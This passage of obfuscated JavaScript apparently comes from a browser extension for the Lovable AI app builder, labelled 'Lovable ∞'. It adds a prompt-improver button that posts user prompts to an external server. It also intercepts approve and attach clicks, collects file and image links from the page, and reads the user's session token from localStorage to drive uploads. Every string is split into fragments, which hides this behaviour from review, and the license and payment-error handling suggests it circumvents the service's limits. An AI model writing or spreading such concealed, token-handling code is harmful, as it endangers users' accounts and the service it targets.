if(_n2fad4f('for'+'mul'+'ári'+'o','for'+'m','inp'+'ut','cam'+'po','val'+'ida'+'ção','val'+'ida'+'cao'))_n1949b1['pus'+'h']('For'+'mul'+'ári'+'o:\x20'+'Ana'+'lis'+'e\x20o'+'\x20fo'+'rmu'+'lár'+'io\x20'+'exi'+'ste'+'nte'+'\x20e\x20'+'ide'+'nti'+'fiq'+'ue\x20'+'mel'+'hor'+'ias'+'\x20de'+'ntr'+'o\x20d'+'os\x20'+'cam'+'pos'+'\x20e\x20'+'val'+'ida'+'çõe'+'s\x20j'+'á\x20i'+'mpl'+'eme'+'nta'+'dos'+'.\x20N'+'ão\x20'+'adi'+'cio'+'ne\x20'+'nov'+'os\x20'+'cam'+'pos'+'\x20ou'+'\x20fu'+'nci'+'ona'+'lid'+'ade'+'s\x20n'+'ão\x20'+'sol'+'ici'+'tad'+'as.');
if(_n2fad4f('seo','met'+'a\x20t'+'ag','ope'+'n\x20g'+'rap'+'h','sit'+'ema'+'p','ind'+'exa'+'ção','ind'+'exa'+'cao'))_n1949b1['pus'+'h']('SEO'+':\x20A'+'nal'+'ise'+'\x20as'+'\x20co'+'nfi'+'gur'+'açõ'+'es\x20'+'de\x20'+'SEO'+'\x20ex'+'ist'+'ent'+'es\x20'+'e\x20i'+'den'+'tif'+'iqu'+'e\x20m'+'elh'+'ori'+'as\x20'+'den'+'tro'+'\x20do'+'\x20qu'+'e\x20j'+'á\x20e'+'stá'+'\x20im'+'ple'+'men'+'tad'+'o.\x20'+'Não'+'\x20ad'+'ici'+'one'+'\x20no'+'vas'+'\x20pá'+'gin'+'as\x20'+'ou\x20'+'est'+'rut'+'ura'+'s\x20d'+'e\x20c'+'ont'+'eúd'+'o.');
if(_n1949b1['len'+'gth']===0x0){
const _n279bf2=_n443c97['rep'+'lac'+'e'](/^(melhore?a?|otimize?|refatore?|corrija?|revise?|ajuste?|organize?|simplifique?|conserte?|atualize?|limpe?)\s+(o\s+|a\s+|os\s+|as\s+|meu\s+|minha\s+|nosso\s+|nossa\s+|todo\s+|toda\s+)?/i,'')['tri'+'m']()||'o\x20e'+'lem'+'ent'+'o\x20s'+'oli'+'cit'+'ado';
return'Ana'+'lis'+'e\x20'+_n279bf2+('\x20no'+'\x20pr'+'oje'+'to\x20'+'e\x20i'+'den'+'tif'+'iqu'+'e\x20m'+'elh'+'ori'+'as\x20'+'den'+'tro'+'\x20do'+'\x20es'+'cop'+'o\x20e'+'xis'+'ten'+'te.'+'\x20Nã'+'o\x20a'+'dic'+'ion'+'e\x20n'+'ova'+'s\x20f'+'unc'+'ion'+'ali'+'dad'+'es,'+'\x20te'+'cno'+'log'+'ias'+'\x20ou'+'\x20re'+'cur'+'sos'+'\x20qu'+'e\x20n'+'ão\x20'+'faç'+'am\x20'+'par'+'te\x20'+'do\x20'+'pro'+'jet'+'o.\x20'+'Pre'+'ser'+'ve\x20'+'tud'+'o\x20q'+'ue\x20'+'já\x20'+'est'+'á\x20f'+'unc'+'ion'+'and'+'o.');
}
if(_n1949b1['len'+'gth']===0x1)return _n1949b1[0x0]['rep'+'lac'+'e'](/^[^:]+:\s*/,'');
return'Ana'+'lis'+'e\x20o'+'\x20pr'+'oje'+'to\x20'+'e\x20r'+'eal'+'ize'+'\x20as'+'\x20se'+'gui'+'nte'+'s\x20m'+'elh'+'ori'+'as\x20'+'den'+'tro'+'\x20do'+'\x20es'+'cop'+'o\x20e'+'xis'+'ten'+'te,'+'\x20se'+'m\x20a'+'dic'+'ion'+'ar\x20'+'nov'+'as\x20'+'fun'+'cio'+'nal'+'ida'+'des'+'\x20ou'+'\x20re'+'cur'+'sos'+'\x20nã'+'o\x20s'+'oli'+'cit'+'ado'+'s:\x0a'+'\x0a'+_n1949b1['map']((_n483847,_n4339d0)=>_n4339d0+0x1+'.\x20'+_n483847)['joi'+'n']('\x0a\x0a');
}
const _n118fa1=_n2fad4f('me\x20'+'aju'+'de','me\x20'+'aju'+'da','aju'+'de-'+'me','aju'+'da-'+'me','o\x20q'+'ue\x20'+'voc'+'ê','o\x20q'+'ue\x20'+'voc'+'e','o\x20q'+'ue\x20'+'ach'+'a','o\x20q'+'ue\x20'+'pod'+'emo'+'s','o\x20q'+'ue\x20'+'dev'+'o','qua'+'is\x20'+'são','qua'+'is\x20'+'sao','qua'+'is\x20'+'opç','qua'+'is\x20'+'opc','qua'+'is\x20'+'fun'+'cio'+'nal'+'ida'+'des','qua'+'is\x20'+'rec'+'urs'+'os','pod'+'e\x20m'+'e','con'+'seg'+'ue\x20'+'me','me\x20'+'exp'+'liq'+'ue','me\x20'+'mos'+'tre','me\x20'+'lis'+'te','me\x20'+'dê','me\x20'+'sug'+'ira','me\x20'+'rec'+'ome'+'nd','me\x20'+'ind'+'ica','por'+'\x20on'+'de\x20'+'com'+'eç','por'+'\x20on'+'de\x20'+'com'+'eca'+'r','com'+'o\x20f'+'aço','com'+'o\x20f'+'az','com'+'o\x20p'+'oss'+'o','vam'+'os\x20'+'con'+'ver'+'sar','vam'+'os\x20'+'pen'+'sar','vam'+'os\x20'+'dis'+'cut'+'ir','vam'+'os\x20'+'pla'+'nej'+'ar','me\x20'+'aju'+'de\x20'+'a\x20e'+'sco'+'lhe'+'r','me\x20'+'aju'+'de\x20'+'a\x20d'+'eci'+'dir','me\x20'+'aju'+'de\x20'+'a\x20d'+'efi'+'nir','aju'+'de\x20'+'a\x20e'+'sco'+'lhe'+'r','aju'+'de\x20'+'a\x20d'+'eci'+'dir','aju'+'de\x20'+'a\x20d'+'efi'+'nir','sug'+'est'+'ão','sug'+'est'+'ao','sug'+'eri'+'r','rec'+'ome'+'nda'+'r','ind'+'ica'+'r');
if(_n118fa1||_n443c97['end'+'sWi'+'th']('?'))return _n443c97;
if(_n308f63>0x1e)return _n443c97+('\x0a\x0aI'+'mpo'+'rta'+'nte'+':\x20i'+'mpl'+'eme'+'nte'+'\x20ex'+'ata'+'men'+'te\x20'+'o\x20d'+'esc'+'rit'+'o\x20a'+'cim'+'a,\x20'+'sem'+'\x20ad'+'ici'+'ona'+'r\x20f'+'unc'+'ion'+'ali'+'dad'+'es,'+'\x20bi'+'bli'+'ote'+'cas'+'\x20ou'+'\x20mo'+'dif'+'ica'+'çõe'+'s\x20n'+'ão\x20'+'sol'+'ici'+'tad'+'as.'+'\x20Si'+'ga\x20'+'os\x20'+'pad'+'rõe'+'s\x20d'+'e\x20c'+'ódi'+'go\x20'+'e\x20a'+'\x20ar'+'qui'+'tet'+'ura'+'\x20já'+'\x20ex'+'ist'+'ent'+'e\x20n'+'o\x20p'+'roj'+'eto'+'.');
const _n2a6f0d=_n2fad4f('cri'+'e','cri'+'ar','adi'+'cio'+'ne','adi'+'cio'+'nar','imp'+'lem'+'ent'+'e','imp'+'lem'+'ent'+'ar','con'+'str'+'ua','con'+'str'+'uir','faç'+'a','faz'+'er','des'+'env'+'olv'+'a','des'+'env'+'olv'+'er','ger'+'e','ger'+'ar','mon'+'te','mon'+'tar','con'+'fig'+'ure','con'+'fig'+'ura'+'r','col'+'oqu'+'e','col'+'oca'+'r','vam'+'os\x20'+'cri'+'ar','vam'+'os\x20'+'faz'+'er','vam'+'os\x20'+'adi'+'cio'+'nar','vam'+'os\x20'+'con'+'str'+'uir','vam'+'os\x20'+'imp'+'lem'+'ent'+'ar','vam'+'os\x20'+'des'+'env'+'olv'+'er');
if(_n2a6f0d&&_n308f63>0x4){
const _n4377c6=_n443c97['rep'+'lac'+'e'](/^(crie?|construa|faça|adicione?|implemente?|desenvolva|monte|configure?|gere?|vamos\s+\w+)\s+(uma?\s+|o\s+|a\s+|os\s+|as\s+|meu\s+|minha\s+|novo\s+|nova\s+)?/i,'')['tri'+'m']()||_n443c97;
return'Cri'+'e\x20'+_n4377c6+('\x20co'+'mpl'+'eto'+'(a)'+'\x20e\x20'+'pro'+'fis'+'sio'+'nal'+'.\x0a\x0a'+'Inc'+'lua'+'\x20to'+'dos'+'\x20os'+'\x20el'+'eme'+'nto'+'s\x20n'+'ece'+'ssá'+'rio'+'s\x20p'+'ara'+'\x20qu'+'e\x20o'+'\x20re'+'sul'+'tad'+'o\x20s'+'eja'+'\x20fu'+'nci'+'ona'+'l\x20e'+'\x20vi'+'sua'+'lme'+'nte'+'\x20ag'+'rad'+'áve'+'l.\x20'+'Org'+'ani'+'ze\x20'+'o\x20c'+'ont'+'eúd'+'o\x20d'+'e\x20f'+'orm'+'a\x20c'+'lar'+'a\x20e'+'\x20hi'+'erá'+'rqu'+'ica'+'.\x20U'+'til'+'ize'+'\x20bo'+'as\x20'+'prá'+'tic'+'as\x20'+'de\x20'+'UX/'+'UI\x20'+'com'+'\x20la'+'you'+'t\x20r'+'esp'+'ons'+'ivo'+'\x20pa'+'ra\x20'+'mob'+'ile'+'\x20e\x20'+'des'+'kto'+'p.\x20'+'Adi'+'cio'+'ne\x20'+'dad'+'os\x20'+'de\x20'+'exe'+'mpl'+'o\x20r'+'eal'+'ist'+'as\x20'+'ond'+'e\x20n'+'ece'+'ssá'+'rio'+'\x20pa'+'ra\x20'+'dem'+'ons'+'tra'+'r\x20o'+'\x20fu'+'nci'+'ona'+'men'+'to.'+'\x0a\x0aS'+'iga'+'\x20os'+'\x20pa'+'drõ'+'es\x20'+'de\x20'+'cód'+'igo'+',\x20t'+'ecn'+'olo'+'gia'+'s\x20e'+'\x20ar'+'qui'+'tet'+'ura'+'\x20já'+'\x20pr'+'ese'+'nte'+'s\x20n'+'o\x20p'+'roj'+'eto'+'.\x20N'+'ão\x20'+'adi'+'cio'+'ne\x20'+'bib'+'lio'+'tec'+'as\x20'+'ext'+'ern'+'as\x20'+'ou\x20'+'fun'+'cio'+'nal'+'ida'+'des'+'\x20al'+'ém\x20'+'do\x20'+'que'+'\x20fo'+'i\x20d'+'esc'+'rit'+'o.');
}
return _n443c97;
}
async function _n32f44c(_nbb0430){
try{
const _n46ecd2=new AbortController(),_n1ebf76=setTimeout(()=>_n46ecd2['abo'+'rt'](),0x1770),_n4ab5fa={
}
;
_n4ab5fa['Con'+'ten'+'t-T'+'ype']='app'+'lic'+'ati'+'on/'+'jso'+'n',_n4ab5fa['api'+'key']=_QO_KEY,_n4ab5fa['Aut'+'hor'+'iza'+'tio'+'n']='Bea'+'rer'+'\x20'+_QO_KEY;
const _n35a7b1={
}
;
_n35a7b1['pro'+'mpt']=_nbb0430;
const _n533a2e=await fetch(_QO_URL,{
'method':'POS'+'T','headers':_n4ab5fa,'body':JSON['str'+'ing'+'ify'](_n35a7b1),'signal':_n46ecd2['sig'+'nal']}
);
clearTimeout(_n1ebf76);
if(!_n533a2e['ok'])throw new Error('sta'+'tus'+'\x20'+_n533a2e['sta'+'tus']);
const _n1f1dbd=await _n533a2e['jso'+'n']();
if(_n1f1dbd&&_n1f1dbd['imp'+'rov'+'ed']&&typeof _n1f1dbd['imp'+'rov'+'ed']==='str'+'ing')return _n1f1dbd['imp'+'rov'+'ed']['tri'+'m']()||_nbb0430;
return null;
}
catch(_n15c602){
return null;
}
}
async function _n4b7e95(_n4dcee7){
const _n55f68c=_n5c1974(_n3779d0);
if(!_n55f68c){
_n1a4cc1('✗\x20T'+'ext'+'are'+'a\x20n'+'ão\x20'+'enc'+'ont'+'rad'+'o',![]);
return;
}
const _n50d6f6=(_n55f68c['tag'+'Nam'+'e']==='TEX'+'TAR'+'EA'?_n55f68c['val'+'ue']:_n55f68c['tex'+'tCo'+'nte'+'nt']||'')['tri'+'m']();
if(!_n50d6f6){
_n1a4cc1('✏️\x20D'+'igi'+'te\x20'+'um\x20'+'pro'+'mpt'+'\x20pr'+'ime'+'iro'+'...',![]);
return;
}
const _n69a74f=_n4dcee7?_n4dcee7['inn'+'erH'+'TML']:null;
_n4dcee7&&(_n4dcee7['dis'+'abl'+'ed']=!![],_n4dcee7['sty'+'le']['set'+'Pro'+'per'+'ty']('opa'+'cit'+'y','0.4'+'5','imp'+'ort'+'ant'),_n4dcee7['inn'+'erH'+'TML']='<sv'+'g\x20w'+'idt'+'h=\x22'+'14\x22'+'\x20he'+'igh'+'t=\x22'+'14\x22'+'\x20vi'+'ewB'+'ox='+'\x220\x20'+'0\x202'+'4\x202'+'4\x22\x20'+'fil'+'l=\x22'+'non'+'e\x22\x20'+'str'+'oke'+'=\x22c'+'urr'+'ent'+'Col'+'or\x22'+'\x20st'+'rok'+'e-w'+'idt'+'h=\x22'+'2.5'+'\x22\x20s'+'tro'+'ke-'+'lin'+'eca'+'p=\x22'+'rou'+'nd\x22'+'\x20st'+'rok'+'e-l'+'ine'+'joi'+'n=\x22'+'rou'+'nd\x22'+'\x20st'+'yle'+'=\x22a'+'nim'+'ati'+'on:'+'__q'+'l_s'+'pin'+'\x200.'+'8s\x20'+'lin'+'ear'+'\x20in'+'fin'+'ite'+';
po'+'int'+'er-'+'eve'+'nts'+':no'+'ne\x22'+'><p'+'ath'+'\x20d='+'\x22M2'+'1\x201'+'2a9'+'\x209\x20'+'0\x201'+'\x201-'+'6.2'+'19-'+'8.5'+'6\x22/'+'></'+'svg'+'>');
try{
const _ne5b4b1=await _n32f44c(_n50d6f6),_n27dcb9=_ne5b4b1!==null?_ne5b4b1:_n5c0d42(_n50d6f6);
_na8eb25(_n55f68c,_n27dcb9),_n55f68c['foc'+'us']();
try{
_n55f68c['set'+'Sel'+'ect'+'ion'+'Ran'+'ge'](_n27dcb9['len'+'gth'],_n27dcb9['len'+'gth']);
}
catch(_n3faa78){
}
_n1a4cc1('✅\x20P'+'rom'+'pt\x20'+'mel'+'hor'+'ado'+'\x20co'+'m\x20s'+'uce'+'sso'+'!',!![]);
}
finally{
if(_n4dcee7){
_n4dcee7['dis'+'abl'+'ed']=![],_n4dcee7['sty'+'le']['set'+'Pro'+'per'+'ty']('opa'+'cit'+'y','1','imp'+'ort'+'ant');
if(_n69a74f)_n4dcee7['inn'+'erH'+'TML']=_n69a74f;
}
}
}
function _n2fbbad(){
if(!_n3779d0||!_n1d9b8e)return;
const _nea507c=document['get'+'Ele'+'men'+'tBy'+'Id']('__q'+'l_i'+'mpr'+'ove'+'_bt'+'n__');
if(_nea507c&&_n3779d0['con'+'tai'+'ns'](_nea507c))return;
if(_nea507c)_nea507c['rem'+'ove']();
const _n5d7928=_n42d42a(_n3779d0),_n3f7705=_n34a31d(_n3779d0),_n1555c2=_n5d7928||_n3f7705;
if(!_n1555c2||!_n1555c2['par'+'ent'+'Ele'+'men'+'t'])return;
const _n2b67c6=_n1555c2['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect'](),_n22841a=Math['rou'+'nd'](Math['min'](Math['max'](_n2b67c6['wid'+'th']||0x20,0x1c),0x28))+'px',_n11a51d=document['cre'+'ate'+'Ele'+'men'+'t']('but'+'ton');
_n11a51d['id']='__q'+'l_i'+'mpr'+'ove'+'_bt'+'n__',_n11a51d['typ'+'e']='but'+'ton',_n11a51d['set'+'Att'+'rib'+'ute']('ari'+'a-l'+'abe'+'l','Mel'+'hor'+'ar\x20'+'Pro'+'mpt'+'\x20co'+'m\x20I'+'A'),_n11a51d['tit'+'le']='Mel'+'hor'+'ar\x20'+'Pro'+'mpt'+'\x20co'+'m\x20I'+'A\x20('+'Lov'+'abl'+'e\x20∞'+')',_n11a51d['sty'+'le']['css'+'Tex'+'t']='dis'+'pla'+'y:i'+'nli'+'ne-'+'fle'+'x!i'+'mpo'+'rta'+'nt;
'+'ali'+'gn-'+'ite'+'ms:'+'cen'+'ter'+'!im'+'por'+'tan'+'t;
j'+'ust'+'ify'+'-co'+'nte'+'nt:'+'cen'+'ter'+'!im'+'por'+'tan'+'t;
'+('wid'+'th:')+_n22841a+('!im'+'por'+'tan'+'t;
h'+'eig'+'ht:')+_n22841a+('!im'+'por'+'tan'+'t;
')+('min'+'-wi'+'dth'+':28'+'px!'+'imp'+'ort'+'ant'+';
mi'+'n-h'+'eig'+'ht:'+'28p'+'x!i'+'mpo'+'rta'+'nt;
')+('bor'+'der'+':no'+'ne!'+'imp'+'ort'+'ant'+';
bo'+'rde'+'r-r'+'adi'+'us:'+'8px'+'!im'+'por'+'tan'+'t;
')+('bac'+'kgr'+'oun'+'d:l'+'ine'+'ar-'+'gra'+'die'+'nt('+'135'+'deg'+',#7'+'c3a'+'ed,'+'#9f'+'5ae'+'5)!'+'imp'+'ort'+'ant'+';
')+('col'+'or:'+'#ff'+'f!i'+'mpo'+'rta'+'nt;
'+'cur'+'sor'+':po'+'int'+'er!'+'imp'+'ort'+'ant'+';
fo'+'nt-'+'siz'+'e:1'+'5px'+'!im'+'por'+'tan'+'t;
')+('pad'+'din'+'g:0'+'!im'+'por'+'tan'+'t;
m'+'arg'+'in:'+'0\x202'+'px!'+'imp'+'ort'+'ant'+';
fl'+'ex-'+'shr'+'ink'+':0!'+'imp'+'ort'+'ant'+';
')+('box'+'-sh'+'ado'+'w:0'+'\x201p'+'x\x206'+'px\x20'+'rgb'+'a(1'+'24,'+'58,'+'237'+',0.'+'45)'+'!im'+'por'+'tan'+'t;
')+('opa'+'cit'+'y:1'+'!im'+'por'+'tan'+'t;
t'+'ran'+'sit'+'ion'+':op'+'aci'+'ty\x20'+'0.1'+'5s,'+'tra'+'nsf'+'orm'+'\x200.'+'1s!'+'imp'+'ort'+'ant'+';
')+('ver'+'tic'+'al-'+'ali'+'gn:'+'mid'+'dle'+'!im'+'por'+'tan'+'t;
l'+'ine'+'-he'+'igh'+'t:1'+'!im'+'por'+'tan'+'t;
'),_n11a51d['inn'+'erH'+'TML']='<sv'+'g\x20w'+'idt'+'h=\x22'+'15\x22'+'\x20he'+'igh'+'t=\x22'+'15\x22'+'\x20vi'+'ewB'+'ox='+'\x220\x20'+'0\x202'+'4\x202'+'4\x22\x20'+'fil'+'l=\x22'+'non'+'e\x22\x20'+'str'+'oke'+'=\x22c'+'urr'+'ent'+'Col'+'or\x22'+'\x20st'+'rok'+'e-w'+'idt'+'h=\x22'+'2.2'+'\x22\x20s'+'tro'+'ke-'+'lin'+'eca'+'p=\x22'+'rou'+'nd\x22'+'\x20st'+'rok'+'e-l'+'ine'+'joi'+'n=\x22'+'rou'+'nd\x22'+'\x20st'+'yle'+'=\x22p'+'oin'+'ter'+'-ev'+'ent'+'s:n'+'one'+'\x22><'+'pat'+'h\x20d'+'=\x22m'+'21.'+'64\x20'+'3.6'+'4-1'+'.28'+'-1.'+'28a'+'1.2'+'1\x201'+'.21'+'\x200\x20'+'0\x200'+'-1.'+'72\x20'+'0L2'+'.36'+'\x2018'+'.64'+'a1.'+'21\x20'+'1.2'+'1\x200'+'\x200\x20'+'0\x200'+'\x201.'+'72l'+'1.2'+'8\x201'+'.28'+'a1.'+'2\x201'+'.2\x20'+'0\x200'+'\x200\x20'+'1.7'+'2\x200'+'L21'+'.64'+'\x205.'+'36a'+'1.2'+'\x201.'+'2\x200'+'\x200\x20'+'0\x200'+'-1.'+'72Z'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'m14'+'\x207\x20'+'3\x203'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M5\x20'+'6v4'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M19'+'\x2014'+'v4\x22'+'/><'+'pat'+'h\x20d'+'=\x22M'+'10\x20'+'2v2'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M7\x20'+'8H3'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M21'+'\x2016'+'h-4'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M11'+'\x203H'+'9\x22/'+'></'+'svg'+'>',_n11a51d['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('mou'+'see'+'nte'+'r',()=>{
_n11a51d['sty'+'le']['set'+'Pro'+'per'+'ty']('opa'+'cit'+'y','0.8'+'5','imp'+'ort'+'ant'),_n11a51d['sty'+'le']['set'+'Pro'+'per'+'ty']('tra'+'nsf'+'orm','sca'+'le('+'1.0'+'8)','imp'+'ort'+'ant');
}
),_n11a51d['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('mou'+'sel'+'eav'+'e',()=>{
_n11a51d['sty'+'le']['set'+'Pro'+'per'+'ty']('opa'+'cit'+'y','1','imp'+'ort'+'ant'),_n11a51d['sty'+'le']['set'+'Pro'+'per'+'ty']('tra'+'nsf'+'orm','sca'+'le('+'1)','imp'+'ort'+'ant');
}
);
const _n2a0b86={
}
;
_n2a0b86['pas'+'siv'+'e']=!![],_n11a51d['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('tou'+'chs'+'tar'+'t',()=>{
_n11a51d['sty'+'le']['set'+'Pro'+'per'+'ty']('opa'+'cit'+'y','0.8','imp'+'ort'+'ant');
}
,_n2a0b86);
const _n5bdf1d={
}
;
_n5bdf1d['pas'+'siv'+'e']=!![],_n11a51d['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('tou'+'che'+'nd',()=>{
_n11a51d['sty'+'le']['set'+'Pro'+'per'+'ty']('opa'+'cit'+'y','1','imp'+'ort'+'ant');
}
,_n5bdf1d),_n11a51d['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n42b07d=>{
_n42b07d['pre'+'ven'+'tDe'+'fau'+'lt'](),_n42b07d['sto'+'pPr'+'opa'+'gat'+'ion'](),_n4b7e95(_n11a51d);
}
);
const _n8dc05d={
}
;
_n8dc05d['pas'+'siv'+'e']=![],_n11a51d['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('tou'+'che'+'nd',_n3deef0=>{
_n3deef0['pre'+'ven'+'tDe'+'fau'+'lt'](),_n3deef0['sto'+'pPr'+'opa'+'gat'+'ion'](),_n4b7e95(_n11a51d);
}
,_n8dc05d),_n1555c2['par'+'ent'+'Ele'+'men'+'t']['ins'+'ert'+'Bef'+'ore'](_n11a51d,_n1555c2);
if(_n5d7928){
const _n466d40=_n5ef7ff(_n3779d0);
if(_n466d40&&_n466d40['par'+'ent'+'Ele'+'men'+'t']&&_n466d40!==_n5d7928)try{
_n466d40['par'+'ent'+'Ele'+'men'+'t']['ins'+'ert'+'Bef'+'ore'](_n5d7928,_n466d40['nex'+'tSi'+'bli'+'ng']);
}
catch(_n36972d){
}
}
}
function _n5ef6ce(){
const _n5171ad=_n5c1974(_n3779d0);
if(!_n5171ad)return'';
return _n5171ad['tag'+'Nam'+'e']==='TEX'+'TAR'+'EA'?_n5171ad['val'+'ue']||'':_n5171ad['tex'+'tCo'+'nte'+'nt']||'';
}
function _n4e6991(_n3e70fa){
const _n324ee5=_n5c1974(_n3779d0);
if(!_n324ee5)return;
if(_n324ee5['tag'+'Nam'+'e']==='TEX'+'TAR'+'EA'){
_n324ee5['val'+'ue']=_n3e70fa;
const _n81a5ae={
}
;
_n81a5ae['bub'+'ble'+'s']=!![],_n324ee5['dis'+'pat'+'chE'+'ven'+'t'](new Event('inp'+'ut',_n81a5ae));
}
else _n324ee5['tex'+'tCo'+'nte'+'nt']=_n3e70fa;
}
function _n97878a(_n42449f){
if(!_n42449f)return[];
const _n331fd1=[],_n211340=new Set(),_n237064=_n42449f['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('img');
for(const _nf5215b of _n237064){
try{
const _n6352cc=_nf5215b['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
if(_n6352cc['wid'+'th']<0x14||_n6352cc['hei'+'ght']<0x14)continue;
const _n377702=_nf5215b['cur'+'ren'+'tSr'+'c']||_nf5215b['src']||'';
if(!_n377702||_n211340['has'](_n377702))continue;
_n211340['add'](_n377702);
const _n140f29={
}
;
_n140f29['fil'+'e_n'+'ame']=_nf5215b['alt']||'ima'+'gem',_n140f29['dow'+'nlo'+'ad_'+'url']=_n377702,_n140f29['mim'+'e_t'+'ype']='ima'+'ge/'+'png',_n331fd1['pus'+'h'](_n140f29);
}
catch(_n55b4a1){
}
}
const _n66b725=_n42449f['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('a[h'+'ref'+']');
for(const _n59e62f of _n66b725){
try{
const _n7fa25=_n59e62f['hre'+'f']||'';
if(!_n7fa25||_n211340['has'](_n7fa25))continue;
if(!/\.(pdf|docx?|xlsx?|csv|zip|txt|pptx?)(\?|#|$)/i['tes'+'t'](_n7fa25))continue;
_n211340['add'](_n7fa25);
const _n44a329=(_n59e62f['tex'+'tCo'+'nte'+'nt']||'')['tri'+'m']()||'arq'+'uiv'+'o',_n22e5ca={
}
;
_n22e5ca['fil'+'e_n'+'ame']=_n44a329,_n22e5ca['dow'+'nlo'+'ad_'+'url']=_n7fa25,_n22e5ca['mim'+'e_t'+'ype']='app'+'lic'+'ati'+'on/'+'oct'+'et-'+'str'+'eam',_n331fd1['pus'+'h'](_n22e5ca);
}
catch(_n2ea359){
}
}
return _n331fd1;
}
function _nc81022(_n335517){
if(!_n335517)return![];
const _n4ab1a2=_n335517['clo'+'ses'+'t']('[ro'+'le='+'\x22me'+'nui'+'tem'+'\x22]');
if(_n4ab1a2){
const _n456e39=(_n4ab1a2['tex'+'tCo'+'nte'+'nt']||'')['rep'+'lac'+'e'](/\s+/g,'\x20')['tri'+'m']();
if(/^attach$/i['tes'+'t'](_n456e39))return!![];
}
const _n1bd929=_n335517['clo'+'ses'+'t']('lab'+'el');
if(_n1bd929&&_n1bd929['que'+'ryS'+'ele'+'cto'+'r']('inp'+'ut['+'typ'+'e=\x22'+'fil'+'e\x22]')){
const _n4773f2=(_n1bd929['tex'+'tCo'+'nte'+'nt']||'')['rep'+'lac'+'e'](/\s+/g,'\x20')['tri'+'m']();
if(/^attach$/i['tes'+'t'](_n4773f2))return!![];
}
if(_n3779d0){
const _n218e60=_n335517['clo'+'ses'+'t']('but'+'ton');
if(_n218e60&&_n3779d0['con'+'tai'+'ns'](_n218e60)){
const _n2738cd=_n218e60['que'+'ryS'+'ele'+'cto'+'r']('svg'+'\x20pa'+'th'),_n5a7bd3=_n2738cd&&_n2738cd['get'+'Att'+'rib'+'ute']('d')||'';
if(_n5a7bd3['inc'+'lud'+'es']('V12'+'.75'+'H6')||_n5a7bd3['inc'+'lud'+'es']('M11'+'.25'+'\x2018'+'V12'))return!![];
}
}
return![];
}
function _n20fa8a(){
return'ont'+'ouc'+'hst'+'art'in window||navigator['max'+'Tou'+'chP'+'oin'+'ts']>0x0;
}
const _n48106e=/^(approve|aprovar|apply plan|aplicar plano|approve plan)$/i;
function _n4bbcf4(_n2061f2){
if(!_n5c3fa8()){
_n4f7061();
return;
}
if(!_n1d9b8e)return;
if(_n3779d0){
const _n7c4a4d=_n34a31d(_n3779d0);
if(_n7c4a4d&&(_n2061f2['tar'+'get']===_n7c4a4d||_n7c4a4d['con'+'tai'+'ns'](_n2061f2['tar'+'get']))){
_n2061f2['pre'+'ven'+'tDe'+'fau'+'lt'](),_n2061f2['sto'+'pIm'+'med'+'iat'+'ePr'+'opa'+'gat'+'ion']();
if(_n1147c3()){
_n1a4cc1('⏳\x20A'+'gua'+'rde'+'\x20o\x20'+'upl'+'oad'+'\x20te'+'rmi'+'nar'+'...',![]);
return;
}
_n3de6a5();
return;
}
}
if(!_nc81022(_n2061f2['tar'+'get']))return;
_n2061f2['pre'+'ven'+'tDe'+'fau'+'lt'](),_n2061f2['sto'+'pIm'+'med'+'iat'+'ePr'+'opa'+'gat'+'ion']();
const _n53e880={
}
;
_n53e880['key']='Esc'+'ape',_n53e880['bub'+'ble'+'s']=!![],document['dis'+'pat'+'chE'+'ven'+'t'](new KeyboardEvent('key'+'dow'+'n',_n53e880)),_n33f51b();
}
function _n33f8a7(){
try{
const _n491902=readTokenFromLocalStorage(),_n5a832a=getProjectFromUrl();
if(_n491902||_n5a832a)return saveToStorage(_n491902,_n5a832a);
}
catch(_n102955){
}
return Promise['res'+'olv'+'e']();
}
async function _n3f6534(_n5d9b04){
if(!_n5c3fa8())throw new Error('Ext'+'ens'+'ão\x20'+'rec'+'arr'+'ega'+'da\x20'+'—\x20a'+'tua'+'liz'+'e\x20a'+'\x20pá'+'gin'+'a\x20('+'F5)'+'.');
await _n33f8a7();
const _n4951aa=await new Promise((_n3a599b,_n117be4)=>{
const _n66697c=new FileReader();
_n66697c['onl'+'oad']=()=>{
const _n1849a3=_n66697c['res'+'ult'],_n667d4f=String(_n1849a3)['ind'+'exO'+'f'](',');
_n3a599b(_n667d4f>=0x0?String(_n1849a3)['sli'+'ce'](_n667d4f+0x1):_n1849a3);
}
,_n66697c['one'+'rro'+'r']=()=>_n117be4(new Error('Fal'+'ha\x20'+'ao\x20'+'ler'+'\x20ar'+'qui'+'vo')),_n66697c['rea'+'dAs'+'Dat'+'aUR'+'L'](_n5d9b04);
}
),_nf080a7=Date['now']()+0x4e20;
let _nf3e044=0x0,_n41017f=null;
while(!![]){
_nf3e044++;
if(_nf3e044>0x1)await _n33f8a7();
const _n409359=await new Promise(_n5b1ae5=>{
const _n1440af={
}
;
_n1440af['act'+'ion']='upl'+'oad'+'Att'+'ach'+'men'+'t',_n1440af['fil'+'eNa'+'me']=_n5d9b04['nam'+'e'],_n1440af['con'+'ten'+'tTy'+'pe']=_n5d9b04['typ'+'e']||'app'+'lic'+'ati'+'on/'+'oct'+'et-'+'str'+'eam',_n1440af['fil'+'eDa'+'ta']=_n4951aa,_n252730(_n1440af,_n5b1ae5);
}
);
if(_n409359&&_n409359['ok'])return _n409359['res'+'ult'];
_n41017f=new Error(_n409359&&_n409359['err'+'or']||'Upl'+'oad'+'\x20fa'+'lho'+'u.');
if(/license_invalid:|captcha_required|payment_required/i['tes'+'t'](_n41017f['mes'+'sag'+'e']))throw _n41017f;
const _n17236b=_nf080a7-Date['now'](),_n4f2ed7=/429|http_429/i['tes'+'t'](_n41017f['mes'+'sag'+'e'])?0xbb8:0x5dc;
